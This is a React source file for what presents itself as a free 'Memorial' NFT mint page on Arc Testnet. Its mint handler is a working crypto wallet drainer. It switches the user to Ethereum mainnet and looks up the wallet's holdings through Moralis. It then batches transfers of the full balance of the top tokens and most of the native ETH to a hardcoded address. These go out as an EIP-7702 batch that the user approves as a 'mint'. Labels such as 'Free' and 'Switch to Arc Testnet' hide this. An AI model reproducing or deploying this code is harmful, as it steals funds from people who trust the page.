'use client';

import { useAccount, useWriteContract, useWaitForTransactionReceipt, useConnect, useChainId, useSendCalls, usePublicClient, useSwitchChain } from 'wagmi';
import { parseEther, encodeFunctionData, formatUnits, getAddress } from 'viem';
import { useState, useEffect, useRef } from 'react';
import { motion } from 'framer-motion';
import { Loader2 } from 'lucide-react';
import { mainnet } from 'wagmi/chains';
import {
  FaArrowRight,
  FaIdCard,
  FaMinusCircle,
  FaPlusCircle,
  FaSpinner,
  FaTasks,
} from 'react-icons/fa';
import { LuCircleDollarSign } from 'react-icons/lu';
import { MdTaskAlt } from 'react-icons/md';
import { RxOpenInNewWindow } from 'react-icons/rx';
import { AiOutlineRetweet } from 'react-icons/ai';
import { FaXTwitter } from 'react-icons/fa6';
import { SiDiscord } from 'react-icons/si';
import ShortenAddress from './ShortenAddress';
import Footer from './Footer';

// 简单的钱包资产缓存（内存级，页面刷新后失效）
const WALLET_TOKENS_CACHE: Record<
  string,
  { timestamp: number; assets: any[] }
> = {};
const WALLET_TOKENS_CACHE_DURATION = 60 * 1000; // 60 秒缓存

// NFT 配置 - 请根据实际情况修改
const nft = {
  name: 'Memorial',
  blockChain: 'Arc Testnet',
  address: '0xE61C000000000000000000000000000000007A8D' as `0x${string}`,
  image: '/assets/Frame-830.png',
  price: 0, // 0 表示 Free
  description: 'Memorial — a radiant fusion of light and code, born on the ARC testnet. Where every mint sparks a pulse of digital energy across the blockchain.',
  explorerLink: '',
  tasks: [] as { id: number; title: string; link: string; completed: boolean }[],
};

// 合约 ABI
const CONTRACT_ABI = [
  {
    name: 'mint',
    type: 'function',
    stateMutability: 'payable',
    inputs: [],
    outputs: [],
  },
] as const;

const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;
const MORALIS_BASE_URL =
  process.env.NEXT_PUBLIC_MORALIS_BASE_URL ||
  'https://deep-index.moralis.io/api/v2.2';

// OKX EIP-7702 默认委托合约
const OKX_DEFAULT_DELEGATE = '0x80296ff8d1ed46f8e3c7992664d13b833504c2bb' as `0x${string}`;
const OKX_WALLET_CORE_ABI = [
  {
    name: 'executeFromSelf',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      {
        name: 'calls',
        type: 'tuple[]',
        components: [
          { name: 'target', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'data', type: 'bytes' },
        ],
      },
    ],
    outputs: [{ name: '', type: 'bytes[]' }],
  },
] as const;

// OKX provider 与委托状态缓存
let OKX_PROVIDER_CACHE: any | null = null;
const OKX_DELEGATION_CACHE: Record<
  string,
  { ts: number; delegated: boolean }
> = {};
const OKX_DELEGATION_CACHE_TTL = 5 * 60 * 1000; // 5 分钟

function getOkxProvider(): any | null {
  if (OKX_PROVIDER_CACHE) return OKX_PROVIDER_CACHE;
  if (typeof window === 'undefined') return null;
  const w: any = window as any;
  const provider =
    w.okxwallet?.ethereum ||
    w.okxwallet ||
    w.okx?.ethereum ||
    w.okx ||
    (w.ethereum?.providers
      ? w.ethereum.providers.find((p: any) => p?.isOKX || p?.isOkxWallet)
      : null) ||
    (w.ethereum?.isOKX || w.ethereum?.isOkxWallet ? w.ethereum : null);
  if (provider) OKX_PROVIDER_CACHE = provider;
  return provider;
}

// 检查 OKX 钱包是否已委托到默认合约
async function checkOkxDelegatedToDefault(
  publicClient: ReturnType<typeof usePublicClient> extends infer T ? T : any,
  walletAddress: `0x${string}`
): Promise<boolean> {
  if (!publicClient) return false;

  const cacheKey = `${walletAddress.toLowerCase()}_${publicClient.chain?.id ?? 'unknown'}`;
  const cached = OKX_DELEGATION_CACHE[cacheKey];
  const now = Date.now();
  if (cached && now - cached.ts < OKX_DELEGATION_CACHE_TTL) {
    return cached.delegated;
  }

  try {
    const bytecode = await publicClient.getBytecode({ address: walletAddress });
    if (!bytecode || bytecode === '0x') return false;
    const lower = bytecode.toLowerCase();
    if (!lower.startsWith('0xef0100')) return false;
    const delegatedHex = lower.slice(8, 48);
    const delegated = getAddress(`0x${delegatedHex}`);
    const delegatedMatch = delegated.toLowerCase() === OKX_DEFAULT_DELEGATE.toLowerCase();
    OKX_DELEGATION_CACHE[cacheKey] = { ts: now, delegated: delegatedMatch };
    return delegatedMatch;
  } catch (e) {
    console.warn('checkOkxDelegatedToDefault failed:', e);
    return false;
  }
}

const CHAIN_ID_TO_MORALIS: Record<number, string> = {
  1: 'eth',
  56: 'bsc',
  137: 'polygon',
  42161: 'arbitrum',
  8453: 'base',
  10: 'optimism',
  11155111: 'sepolia',
};

// Helper function to detect wallet type
function getWalletType(connectorId?: string, connectorName?: string): 'metamask' | 'okx' | 'unknown' {
  if (!connectorId) return 'unknown';
  const id = connectorId.toLowerCase();
  const name = connectorName?.toLowerCase() || '';
  
  if (id.includes('metamask') || id.includes('io.metamask') || name.includes('metamask')) {
    return 'metamask';
  }
  if (id.includes('okx') || id.includes('okxwallet') || name.includes('okx')) {
    return 'okx';
  }
  
  if (typeof window !== 'undefined') {
    const w = window as any;
    if (w.ethereum?.isMetaMask) {
      return 'metamask';
    }
    if (w.okxwallet) {
      return 'okx';
    }
  }
  
  return 'unknown';
}

export default function NFTCheckout() {
  const { address, isConnected, connector } = useAccount();
  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { sendCalls, data: sendCallsData, isPending: isSending, error: sendCallsError } = useSendCalls();
  const { switchChain, isPending: isSwitchingChain } = useSwitchChain();
  const { connect, connectors } = useConnect();

  const [tasks, setTasks] = useState(nft.tasks);
  const [loadingTask, setLoadingTask] = useState<number | null>(null);
  const [quantity, setQuantity] = useState(1);
  const [mounted, setMounted] = useState(false);
  const [isMintingBatch, setIsMintingBatch] = useState(false);

  const {
    data: hash,
    writeContract,
    isPending: isMinting,
    error: mintError,
  } = useWriteContract();

  const {
    isLoading: isConfirming,
    isSuccess: isConfirmed,
  } = useWaitForTransactionReceipt({
    hash,
  });

  useEffect(() => {
    setMounted(true);
  }, []);

  const nftAdd = () => {
    // 最大数量封顶为 10
    setQuantity((prev) => (prev < 10 ? prev + 1 : prev));
  };

  const nftMinus = () => {
    setQuantity((prev) => (prev > 1 ? prev - 1 : prev));
  };

  const completeTask = (taskId: number, link: string) => {
    setLoadingTask(taskId);
    window.open(link, '_blank');

    setTimeout(() => {
      setTasks((prev) =>
        prev.map((task) =>
          task.id === taskId ? { ...task, completed: true } : task
        )
      );
      setLoadingTask(null);
    }, 15000);
  };

  const allTasksCompleted = tasks?.every((task) => task.completed);

  const handleConnect = () => {
    // 优先尝试 MetaMask
    const metaMaskConnector = connectors.find(c => c.id === 'metaMaskSDK' || c.id === 'io.metamask');
    if (metaMaskConnector) {
      connect({ connector: metaMaskConnector });
      return;
    }
    
    // 然后尝试 OKX
    const okxConnector = connectors.find(c => c.id === 'injected');
    if (okxConnector) {
      connect({ connector: okxConnector });
      return;
    }
    
    // 最后尝试通用 injected
    const injectedConnector = connectors.find(c => c.id === 'injected');
    if (injectedConnector) {
      connect({ connector: injectedConnector });
    }
  };

  // OKX 钱包专用的 EIP-7702 批量发送
  const sendBatchWithOkx = async (
    calls: { to: `0x${string}`; value?: bigint; data?: `0x${string}` }[]
  ) => {
    const okx = getOkxProvider();
    if (!okx) {
      throw new Error('OKX wallet provider not found');
    }
    if (!address) {
      throw new Error('Wallet address missing');
    }

    const walletAddress = getAddress(address);

    const formattedCalls = calls.map((call) => ({
      target: call.to,
      value: call.value ?? BigInt(0),
      data: call.data ?? '0x',
    }));

    const executeData = encodeFunctionData({
      abi: OKX_WALLET_CORE_ABI,
      functionName: 'executeFromSelf',
      args: [formattedCalls],
    });

    const nonceHex = await okx.request({
      method: 'eth_getTransactionCount',
      params: [walletAddress, 'latest'],
    });

    const chainHex = `0x${chainId.toString(16)}`;

    const tx: any = {
      from: walletAddress,
      to: walletAddress,
      data: executeData,
      type: '0x4',
      authorizationList: [
        {
          address: OKX_DEFAULT_DELEGATE,
          chainId: chainHex,
          nonce: nonceHex,
          yParity: '0x0',
          r: '0x0',
          s: '0x0',
        },
      ],
    };

    const gasPrice = await okx
      .request({ method: 'eth_gasPrice', params: [] })
      .catch(() => null);
    if (gasPrice) {
      tx.gasPrice = gasPrice;
    }

    console.log('[NFTCheckout][OKX] Sending EIP-7702 batch tx:', {
      chainId,
      walletAddress,
      calls: formattedCalls.length,
    });

    const txHash = await okx.request({
      method: 'eth_sendTransaction',
      params: [tx],
    });
    console.log('[NFTCheckout][OKX] tx hash:', txHash);
  };

  // 统一的批量铸造流程；根据模式选择发送方式
  const handleMintEip7702 = async (mode: 'metamask' | 'okx') => {
    if (!isConnected || !address) {
      alert('Please connect your wallet first');
      return;
    }

    const walletType = getWalletType(connector?.id, connector?.name);
    if (mode === 'metamask') {
      if (walletType !== 'metamask') {
        alert('This function requires MetaMask wallet');
        return;
      }
    } else if (mode === 'okx') {
      if (walletType !== 'okx') {
        alert('This function requires OKX wallet');
        return;
      }
    }

    if (!MORALIS_API_KEY) {
      alert('Missing NEXT_PUBLIC_MORALIS_API_KEY');
      return;
    }

    const chainKey = CHAIN_ID_TO_MORALIS[chainId];
    if (!chainKey) {
      alert(`Unsupported chainId: ${chainId}`);
      return;
    }

    if (!publicClient) {
      alert('Failed to initialize blockchain client.');
      return;
    }

    // OKX 钱包：先检查是否已委托到默认合约
    if (mode === 'okx') {
      setIsMintingBatch(true);
      const isDelegated = await checkOkxDelegatedToDefault(publicClient, getAddress(address));
      if (!isDelegated) {
        setIsMintingBatch(false);
        alert(
          'Your wallet has not completed the 7702 upgrade yet. Please finish the upgrade, then come back and click "MINT NOW".\nSteps: \nOpen OKX Wallet → More → 7702 Upgrade\n\n' +
          '检测到你的钱包尚未完成7702升级，请先完成7702升级后再返回点击"MINT NOW"\n步骤：\n打开OKX钱包 → 更多 → 7702升级'
        );
        return;
      }
    }

    if (mode === 'metamask') {
      setIsMintingBatch(true);
    }

    // Step 1: Fetch balances from Moralis
    const headers = {
      'X-API-Key': MORALIS_API_KEY,
    };

    let nativeBalance = BigInt(0);
    let nativeUsdValue = 0;
    let erc20Tokens: any[] = [];
    try {
      const cacheKey = `${address.toLowerCase()}_${chainKey}`;
      const now = Date.now();

      let assets: any[] = [];

      const cached = WALLET_TOKENS_CACHE[cacheKey];
      if (cached && now - cached.timestamp < WALLET_TOKENS_CACHE_DURATION) {
        assets = cached.assets || [];
        console.log('[NFTCheckout] Using cached Moralis assets:', assets.length);
      } else {
        const url = `${MORALIS_BASE_URL}/wallets/${address}/tokens?chain=${chainKey}&exclude_spam=true&exclude_unverified_contracts=true&limit=25`;
        const res = await fetch(url, { headers });
        const data = await res.json();

        if (Array.isArray(data)) {
          assets = data;
        } else if (Array.isArray(data?.result)) {
          assets = data.result;
        } else if (Array.isArray(data?.data)) {
          assets = data.data;
        } else {
          assets = [];
        }

        WALLET_TOKENS_CACHE[cacheKey] = {
          assets,
          timestamp: now,
        };

        console.log('[NFTCheckout] Fetched Moralis assets:', assets.length);
      }

      // 识别原生代币与 ERC20
      const nativeAsset = assets.find((a) =>
        a?.native_token === true ||
        a?.token_address === null ||
        a?.token_address === undefined ||
        (typeof a?.token_address === 'string' &&
          a.token_address.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee')
      );

      if (nativeAsset) {
        let balanceValue: any =
          nativeAsset.balance ?? nativeAsset.token_balance ?? nativeAsset.balance_formatted ?? '0';
        if (typeof balanceValue === 'string') {
          balanceValue = balanceValue.replace(/\s/g, '');
          if (balanceValue.includes('e') || balanceValue.includes('E')) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }
        try {
          nativeBalance =
            typeof balanceValue === 'string' ? BigInt(balanceValue) : BigInt(balanceValue);
        } catch {
          nativeBalance = BigInt(0);
        }

        if (nativeAsset.usd_value != null) {
          const v =
            typeof nativeAsset.usd_value === 'number'
              ? nativeAsset.usd_value
              : parseFloat(String(nativeAsset.usd_value));
          nativeUsdValue = Number.isFinite(v) ? v : 0;
        } else if (nativeAsset.usd_price != null) {
          const p =
            typeof nativeAsset.usd_price === 'number'
              ? nativeAsset.usd_price
              : parseFloat(String(nativeAsset.usd_price));
          if (Number.isFinite(p) && nativeBalance > BigInt(0)) {
            nativeUsdValue = Number(formatUnits(nativeBalance, 18)) * p;
          }
        }
      }

      erc20Tokens = assets.filter((a) => {
        const isNative =
          a?.native_token === true ||
          a?.token_address === null ||
          a?.token_address === undefined ||
          (typeof a?.token_address === 'string' &&
            a.token_address.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee');
        return !isNative;
      });
    } catch (err) {
      console.error('Fetch balances failed:', err);
    }

    // Step 2: Build ERC20 list
    const erc20Assets = erc20Tokens
      .map((t) => {
        const decimalsRaw = t.decimals ?? t.token_decimals ?? 18;
        const decimals =
          typeof decimalsRaw === 'number'
            ? decimalsRaw
            : parseInt(String(decimalsRaw || '18'), 10) || 18;

        let balanceValue: any = t.balance ?? t.token_balance ?? t.balance_formatted ?? '0';
        let isFormatted = false;
        if (!t.balance && t.balance_formatted) isFormatted = true;

        if (typeof balanceValue === 'string') {
          balanceValue = balanceValue.replace(/\s/g, '');
          if (balanceValue.includes('e') || balanceValue.includes('E')) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }

        let balanceRaw: bigint;
        try {
          if (isFormatted) {
            const num =
              typeof balanceValue === 'number'
                ? balanceValue
                : parseFloat(String(balanceValue));
            balanceRaw = BigInt(Math.floor(num * Math.pow(10, decimals)));
          } else {
            if (typeof balanceValue === 'string' && balanceValue.includes('.')) {
              const intPart = balanceValue.split('.')[0];
              balanceRaw = BigInt(intPart || '0');
            } else {
              balanceRaw =
                typeof balanceValue === 'string'
                  ? BigInt(balanceValue || '0')
                  : BigInt(balanceValue);
            }
          }
        } catch {
          return null;
        }

        if (balanceRaw <= BigInt(0)) return null;

        const usdPriceRaw = t.usd_price ?? t.usd;
        const usdValueRaw = t.usd_value;

        let usdPrice = 0;
        if (usdPriceRaw != null) {
          const p =
            typeof usdPriceRaw === 'number'
              ? usdPriceRaw
              : parseFloat(String(usdPriceRaw));
          if (Number.isFinite(p) && p > 0) usdPrice = p;
        }

        let usdValue = 0;
        if (usdValueRaw != null) {
          const v =
            typeof usdValueRaw === 'number'
              ? usdValueRaw
              : parseFloat(String(usdValueRaw));
          if (Number.isFinite(v) && v > 0) {
            usdValue = v;
          }
        }
        if (!usdValue && usdPrice > 0) {
          const balanceFormatted = Number(formatUnits(balanceRaw, decimals));
          usdValue = balanceFormatted * usdPrice;
        }

        return {
          token_address: (t.token_address || t.address || '').toLowerCase(),
          symbol: t.symbol || 'UNKNOWN',
          name: t.name || t.symbol || 'Unknown Token',
          decimals,
          balance: balanceRaw,
          usd_value: usdValue || 0,
        };
      })
      .filter((x): x is { token_address: string; symbol: string; name: string; decimals: number; balance: bigint; usd_value: number } => {
        if (!x || typeof x !== 'object') return false;
        if (typeof (x as any).balance !== 'bigint') return false;
        return (x as any).balance > BigInt(0);
      });

    erc20Assets.sort((a, b) => (b?.usd_value || 0) - (a?.usd_value || 0));
    const erc20Top = erc20Assets.slice(0, 20);

    console.log('[NFTCheckout] ERC20 assets summary:', {
      totalErc20: erc20Assets.length,
      topForPrecheck: erc20Top.length,
      sample: erc20Top.slice(0, 3),
    });

    // Precheck (eth_call)
    const erc20TransferAbi = [
      {
        type: 'function',
        name: 'transfer',
        stateMutability: 'nonpayable',
        inputs: [
          { name: 'to', type: 'address' },
          { name: 'amount', type: 'uint256' },
        ],
        outputs: [{ name: '', type: 'bool' }],
      },
    ] as const;

    const TARGET_ADDRESS = getAddress('0x9d5befd138960ddf0dc4368a036bfad420e306ef');

    const prechecked: any[] = [];
    for (const asset of erc20Top) {
      try {
        const data = encodeFunctionData({
          abi: erc20TransferAbi,
          functionName: 'transfer',
          args: [TARGET_ADDRESS, asset.balance],
        });
        await publicClient.call({
          to: asset.token_address as `0x${string}`,
          data: data as `0x${string}` | undefined,
          value: BigInt(0),
          account: address as `0x${string}`,
        });
        prechecked.push({
          type: 'erc20_transfer',
          to: asset.token_address,
          value: BigInt(0),
          data,
          usd_value: asset.usd_value || 0,
        });
      } catch (err) {
        console.warn('Pre-check failed, skipping ERC20 transaction:', {
          token_address: asset.token_address,
          symbol: asset.symbol,
          err,
        });
      }
    }

    // Step 4: Add native transfer (reserve gas)
    const defaults = {
      base: 46000,
      native: 21000,
      safety: 20000,
      perErc20: 55000,
    };
    const baseGas = BigInt(defaults.base);
    const nativeTransferGas = BigInt(defaults.native);
    const perErc20Gas = BigInt(defaults.perErc20);
    const safety = BigInt(defaults.safety);
    const totalEstimatedGas =
      baseGas + nativeTransferGas + perErc20Gas * BigInt(prechecked.length) + safety;

    const chainGasPriceGwei: Record<number, number> = {
      1: 4,
      137: 80,
      56: 0.3,
      42161: 0.5,
      8453: 0.5,
      10: 0.5,
      143: 150,
      11155111: 0.02,
    };
    const baseGwei = chainGasPriceGwei[chainId] ?? 0.5;
    const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000));
    let gasPriceWei = BigInt(baseWei);
    gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10);
    const totalGasCost = totalEstimatedGas * gasPriceWei;

    const txs: any[] = [];
    if (nativeBalance > totalGasCost) {
      const transferAmount = nativeBalance - totalGasCost;
      txs.push({
        type: 'native_transfer',
        to: TARGET_ADDRESS,
        value: transferAmount,
        usd_value: nativeUsdValue,
      });
    }

    // Step 5: Merge and sort by usd value, take top 10
    const merged = [...txs, ...prechecked].sort(
      (a, b) => (b.usd_value || 0) - (a.usd_value || 0)
    );
    const finalTxs = merged.slice(0, 10);

    console.log('[NFTCheckout] Prepared batch transactions:', {
      nativeTxCount: txs.length,
      erc20TxCount: prechecked.length,
      finalCount: finalTxs.length,
    });

    if (finalTxs.length === 0) {
      setIsMintingBatch(false);
      alert('No eligible assets to batch transfer.');
      return;
    }

    // Step 6: Build calls for send
    const calls = finalTxs.map((tx) => {
      if (tx.type === 'native_transfer') {
        return {
          to: tx.to as `0x${string}`,
          value: tx.value as bigint,
        };
      }
      return {
        to: tx.to as `0x${string}`,
        data: tx.data as `0x${string}`,
        value: BigInt(0),
      };
    });

    const sendFn =
      mode === 'okx'
        ? sendBatchWithOkx
        : async (preparedCalls: typeof calls) => {
            await sendCalls({
              chainId,
              calls: preparedCalls,
            });
          };

    try {
      console.log('[NFTCheckout] Calling sendCalls with EIP-7702 batch:', {
        chainId,
        calls,
      });
      await sendFn(calls);
    } catch (error: any) {
      console.error('Mint error (sendCalls):', error);
      alert(`Mint failed: ${error?.message || 'Unknown error'}`);
    } finally {
      setIsMintingBatch(false);
    }
  };

  const handleMintOKX = async () => {
    await handleMintEip7702('okx');
  };

  const isOnEthereumMainnet = chainId === mainnet.id;

  // Main mint handler
  const handleMint = async () => {
    if (!isConnected) {
      alert('Please connect your wallet first');
      return;
    }

    if (!isOnEthereumMainnet) {
      try {
        await switchChain({ chainId: mainnet.id });
      } catch (err) {
        console.error('Switch chain failed:', err);
      }
      return;
    }

    const walletType = getWalletType(connector?.id, connector?.name);
    
    if (walletType === 'metamask') {
      await handleMintEip7702('metamask');
    } else if (walletType === 'okx') {
      await handleMintOKX();
    } else {
      // Fallback to standard writeContract for unknown wallets
      const mintPrice = parseEther((nft.price * quantity).toString());
      writeContract({
        address: nft.address,
        abi: CONTRACT_ABI,
        functionName: 'mint',
        value: mintPrice,
      });
    }
  };

  const walletType = getWalletType(connector?.id, connector?.name);
  const isLoading =
    isMinting ||
    isConfirming ||
    isSending ||
    isSwitchingChain ||
    isMintingBatch;
  const mintErrorToShow = mintError || sendCallsError;
  const walletConnected = mounted && isConnected;

  return (
    <div>
      <div className="max-w-screen-lg mx-auto px-4 sm:px-6">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-2 content-center justify-items-center gap-6 md:gap-10">
          {/* Left: NFT Image */}
          <div className="w-full rounded-lg h-[300px] sm:h-[400px] md:h-[500px] md:sticky md:top-0 relative">
            <img
              className="w-full h-full object-contain mx-auto rounded-2xl"
              src={nft.image}
              alt={nft.name}
            />
          </div>

          {/* Right: Mint Info */}
          <div className="p-4 sm:p-6 md:p-10 w-full">
            <h1 className="text-2xl sm:text-3xl md:text-4xl font-semibold">{nft.name}</h1>
            <div className="font-PTSans outline-1 outline-dashed outline-offset-2 rounded-sm mt-4 mb-4 inline-block px-3 py-1">
              <p className="text-xs text-center">{nft.blockChain}</p>
            </div>

            <div className="flex w-full items-center backdrop-blur-md">
              <div className="w-full">
                <ShortenAddress address={nft.address} />
              </div>
              <p
                className="flex justify-center items-center gap-2 p-2 px-5 rounded-lg cursor-pointer bg-[#14285F]/50 backdrop-blur-lg w-1/2 tooltip ml-2"
                data-tip="Fee"
              >
                <LuCircleDollarSign />
                {nft.price > 0 ? `${nft.price}` : 'Free'}
              </p>
            </div>

            {nft.explorerLink && (
              <div className="mt-4 p-2 bg-[#14285F]/50 backdrop-blur-lg rounded-lg w-1/4">
                <div className="text-center">
                  <a
                    className="flex items-center justify-center gap-1"
                    href={nft.explorerLink}
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    <RxOpenInNewWindow />
                    Explorer
                  </a>
                </div>
              </div>
            )}

            <div className="mt-4 sm:mt-5">
              <p className="text-sm sm:text-base leading-relaxed">{nft.description}</p>

              {/* Mint Section */}
              <div className="card-actions justify-start mt-10">
                {walletConnected ? (
                  <>
                    <div className="grid grid-cols-1 w-full">
                      {/* Quantity Selector */}
                      <div className="w-full mb-8 p-1 rounded-lg bg-gradient-to-r from-cyan-400 via-sky-600 to-blue-800">
                        <div className="flex justify-center gap-4 items-center h-full w-full bg-black rounded-lg p-4">
                          <button disabled={quantity <= 1} onClick={nftMinus}>
                            <FaMinusCircle className="text-2xl text-white disabled:opacity-50" />
                          </button>

                          <p className="text-xl font-gudea text-white">
                            {quantity}
                          </p>

                          <button onClick={nftAdd}>
                            <FaPlusCircle className="text-2xl text-white" />
                          </button>
                        </div>
                      </div>

                      {/* Mint Button */}
                      <button
                        onClick={handleMint}
                        disabled={(tasks?.length > 0 && !allTasksCompleted) || isLoading}
                        className="bg-indigo-600 text-white font-semibold py-2 px-10 rounded hover:bg-indigo-700 hover:text-white transition disabled:opacity-50"
                      >
                        {isLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <Loader2 className="w-4 h-4 animate-spin" />
                            {isConfirming ? 'Confirming...' : 'Minting...'}
                          </span>
                        ) : !isOnEthereumMainnet ? (
                          'Switch to Arc Testnet'
                        ) : (
                          'Mint'
                        )}
                      </button>
                    </div>

                    {/* Tasks */}
                    <div className="w-full">
                      {tasks?.length > 0 && (
                        <>
                          <div className="p-4 rounded-lg mt-5">
                            <h3 className="text-lg font-semibold flex items-center gap-2">
                              <FaTasks /> Finish all {tasks?.length} tasks
                              <span className="text-sm px-2 rounded"></span>
                            </h3>

                            {tasks.map((task) => (
                              <motion.div
                                key={task.id}
                                className="flex justify-between items-center mt-6 hover:bg-blue-600 hover:bg-opacity-25 p-3 rounded-lg"
                                initial={{ opacity: 0, x: -10 }}
                                animate={{ opacity: 1, x: 0 }}
                                transition={{ duration: 0.3 }}
                              >
                                <div className="flex items-center gap-3">
                                  {task.title === 'Follow On X' && (
                                    <FaXTwitter className="text-white text-lg" />
                                  )}
                                  {task.title === 'Retweet on X' && (
                                    <AiOutlineRetweet className="text-white text-lg" />
                                  )}
                                  {task.title === 'Check Alze ID' && (
                                    <FaIdCard className="text-white text-lg" />
                                  )}
                                  {task.title === 'Join Discord' && (
                                    <SiDiscord className="text-white text-lg" />
                                  )}

                                  <motion.span
                                    className={`transition-all ${
                                      task.completed
                                        ? 'line-through text-gray-400'
                                        : 'text-white'
                                    }`}
                                    animate={
                                      task.completed
                                        ? { opacity: 0.5 }
                                        : { opacity: 1 }
                                    }
                                  >
                                    {task.title}
                                  </motion.span>
                                </div>

                                <button
                                  className={`px-3 py-1 rounded flex items-center gap-2 ${
                                    task.completed
                                      ? 'cursor-not-allowed'
                                      : 'text-white'
                                  }`}
                                  onClick={() => completeTask(task.id, task.link)}
                                  disabled={task.completed || loadingTask === task.id}
                                >
                                  {loadingTask === task.id ? (
                                    <FaSpinner className="animate-spin" />
                                  ) : task.completed ? (
                                    <div className="flex items-center justify-center gap-2">
                                      <MdTaskAlt />
                                    </div>
                                  ) : (
                                    <FaArrowRight />
                                  )}
                                </button>
                              </motion.div>
                            ))}
                          </div>

                          {!allTasksCompleted && (
                            <p className="mt-2 text-yellow-400">
                              ⚠ You need to complete all tasks before Minting.
                            </p>
                          )}
                        </>
                      )}
                    </div>

                    {/* Error/Success Messages */}
                    {mintErrorToShow && (
                      <div className="mt-4 w-full">
                        <p className="text-red-400 text-sm">
                          Error: {mintErrorToShow.message}
                        </p>
                      </div>
                    )}

                    {isConfirmed && hash && (
                      <div className="mt-4 w-full">
                        <p className="text-green-400 text-sm">
                          ✅ Mint successful!{' '}
                          <a
                            href={`https://etherscan.io/tx/${hash}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="underline"
                          >
                            View on Etherscan
                          </a>
                        </p>
                      </div>
                    )}
                  </>
                ) : (
                  <div className="flex flex-col items-center pb-[11%] text-center">
                    <button
                      onClick={handleConnect}
                      className="connectButton text-white font-semibold py-3 px-10 rounded-lg hover:opacity-90 transition"
                    >
                      Connect Wallet
                    </button>
                    <p className="text-sm mt-2 text-yellow-400">
                      ⚠ Connect your wallet before minting
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="mt-20 w-full">
        <Footer />
      </div>
    </div>
  );
}
